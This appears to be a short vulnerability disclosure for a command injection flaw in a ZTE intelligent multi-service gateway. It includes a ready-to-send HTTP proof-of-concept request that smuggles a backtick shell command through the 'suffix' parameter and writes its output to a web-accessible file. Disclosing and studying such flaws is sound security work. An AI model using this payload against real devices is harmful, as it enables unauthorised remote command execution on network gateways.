ZTE Wantong intelligent multi-service system has command execution vulnerability

version:v1.0

1. Impact of vulnerabilities
Intelligent multi-service gateway

2. Vulnerability location
aaa_portal_auth_local_submit

3. Code analysis
![image](https://github.com/since2019-costin/cve/assets/169053485/65f5e6d0-99af-4129-9b62-f37db306b8ac)
![image](https://github.com/since2019-costin/cve/assets/169053485/f6b3f250-c9c6-40d0-a105-3f8c1315b02a)

4. Vulnerability recurrence

   ![image](https://github.com/since2019-costin/cve/assets/169053485/8071998f-e7af-442f-b03d-7f4a7dc3472f)
Write the id command to the 1.txt file in the root directory through ``, the poc is as follows

POC
```

GET /webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&suffix=%60id+%3E/usr/local/webui/1.txt%60 HTTP/1.1
Host: ip:9443
Cookie: USGSESSID=454287762a807fb134c4e258bda9eccd
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
X-Forwarded-For: 192.168.1.23
Te: trailers
Connection: close
```

![image](https://github.com/since2019-costin/cve/assets/169053485/b35aae1e-1801-46d4-8327-42c295dd9eaf)

Visit/1.txt

![image](https://github.com/since2019-costin/cve/assets/169053485/3151103e-83fc-4c38-961a-71148231c0ff)

